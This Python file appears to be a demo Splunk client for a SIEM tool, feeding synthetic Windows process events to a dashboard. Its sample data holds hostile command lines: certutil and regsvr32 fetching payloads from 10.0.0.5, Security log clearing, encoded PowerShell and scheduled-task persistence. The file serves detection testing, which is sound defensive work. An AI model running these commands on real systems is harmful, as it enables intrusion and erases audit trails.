from __future__ import annotations

import itertools
import threading
import time
from datetime import datetime, timezone
from typing import Callable, Optional

EventCallback = Callable[[dict], None]
StatusCallback = Callable[[bool, str], None]


def _epoch_now(offset_sec: int = 0) -> float:
    return datetime.now(tz=timezone.utc).timestamp() - offset_sec


_DEMO_RESULTS = [
    {
        "_time": _epoch_now(120),
        "Computer": "TARGET-PC",
        "User": "LAB\\analyst",
        "EventCode": "1",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": (
            "powershell.exe -NoProfile -enc "
            "SQBuAHYAbwBrAGUALgBlAHgAcAByAGUAc3Npb24="
        ),
    },
    {
        "_time": _epoch_now(90),
        "Computer": "TARGET-PC",
        "User": "LAB\\analyst",
        "EventCode": "1",
        "Image": r"C:\Windows\System32\cmd.exe",
        "CommandLine": r'cmd.exe /c echo mimikatz-lab-test',
    },
    {
        "_time": _epoch_now(60),
        "Computer": "TARGET-PC",
        "User": "NT AUTHORITY\\SYSTEM",
        "EventCode": "1",
        "Image": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "CommandLine": (
            "powershell.exe -Command "
            "\"Invoke-Expression 'Write-Host SIEM demo IEX test'\""
        ),
    },
    {
        "_time": _epoch_now(30),
        "Computer": "WORKSTATION-02",
        "User": "CORP\\jdoe",
        "EventCode": "1",
        "Image": r"C:\Windows\System32\rundll32.exe",
        "CommandLine": "rundll32.exe javascript:alert('demo')",
    },
    {
        "_time": _epoch_now(10),
        "Computer": "TARGET-PC",
        "User": "LAB\\analyst",
        "EventCode": "1102",
        "Image": r"C:\Windows\System32\wevtutil.exe",
        "CommandLine": "wevtutil cl Security",
    },

    {
        "_time": _epoch_now(48),
        "Computer": "WORKSTATION-02",
        "User": "CORP\\jdoe",
        "EventCode": "1",
        "Image": r"C:\Windows\System32\certutil.exe",
        "CommandLine": (
            "certutil.exe -urlcache -f http://10.0.0.5/stage.bin C:\\Temp\\stage.bin"
        ),
    },
    {
        "_time": _epoch_now(42),
        "Computer": "TARGET-PC",
        "User": "LAB\\analyst",
        "EventCode": "1",
        "Image": r"C:\Windows\System32\schtasks.exe",
        "CommandLine": (
            r'schtasks.exe /create /tn "SIEM-Demo-Updater" /tr C:\Lab\update.exe '
            r"/sc daily /st 09:00"
        ),
    },
    {
        "_time": _epoch_now(36),
        "Computer": "WORKSTATION-02",
        "User": "CORP\\jdoe",
        "EventCode": "1",
        "Image": r"C:\Windows\System32\regsvr32.exe",
        "CommandLine": "regsvr32.exe /s /i:http://10.0.0.5/demo.sct scrobj.dll",
    },

    {
        "_time": _epoch_now(22),
        "Computer": "TARGET-PC",
        "User": "NT AUTHORITY\\SYSTEM",
        "EventCode": "1",
        "Image": r"C:\Windows\System32\svchost.exe",
        "CommandLine": r"C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule",
    },
    {
        "_time": _epoch_now(18),
        "Computer": "WORKSTATION-02",
        "User": "CORP\\jdoe",
        "EventCode": "1",
        "Image": r"C:\Windows\System32\SearchIndexer.exe",
        "CommandLine": r"C:\Windows\System32\SearchIndexer.exe /Embedding",
    },
    {
        "_time": _epoch_now(14),
        "Computer": "TARGET-PC",
        "User": "CORP\\jdoe",
        "EventCode": "1",
        "Image": r"C:\Program Files\Vendor\App\update.exe",
        "CommandLine": r'"C:\Program Files\Vendor\App\update.exe" --check',
    },
]


class DemoSplunkClient:


    def __init__(self, config) -> None:
        self.config = config
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._last_poll_at: float = 0.0
        self._poll_in_progress = False
        self._cycle = itertools.cycle(_DEMO_RESULTS)

    def test_connection(self, on_status: StatusCallback) -> None:
        on_status(True, "Demo mode (no Splunk required)")

    def query_once(
        self,
        on_event: EventCallback,
        on_status: StatusCallback,
    ) -> None:
        self._poll_in_progress = True
        try:
            batch = 2
            for _ in range(batch):
                if self._stop_event.is_set():
                    break
                row = dict(next(self._cycle))
                row["_time"] = _epoch_now(5)
                on_event(row)
            on_status(True, f"OK (demo - {batch} synthetic events)")
        finally:
            self._poll_in_progress = False
            self._last_poll_at = time.monotonic()

    def poll_is_stale(self, max_age: float) -> bool:
        if self._poll_in_progress:
            return False
        if self._last_poll_at <= 0:
            return True
        return (time.monotonic() - self._last_poll_at) > max_age

    def start_polling(
        self,
        on_event: EventCallback,
        on_status: StatusCallback,
    ) -> None:
        if self._thread is not None and self._thread.is_alive():
            return
        self._stop_event.clear()

        def worker() -> None:
            while not self._stop_event.is_set():
                try:
                    self.query_once(on_event, on_status)
                except Exception as exc:
                    on_status(False, f"Demo poll error: {exc}")
                interval = max(5, int(self.config.get("poll_interval") or 30))
                for _ in range(interval):
                    if self._stop_event.is_set():
                        return
                    time.sleep(1)

        self._thread = threading.Thread(target=worker, name="DemoPoller", daemon=True)
        self._thread.start()

    def stop_polling(self) -> None:
        self._stop_event.set()
        t = self._thread
        if t is not None and t.is_alive():
            t.join(timeout=3.0)
        self._thread = None

    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()
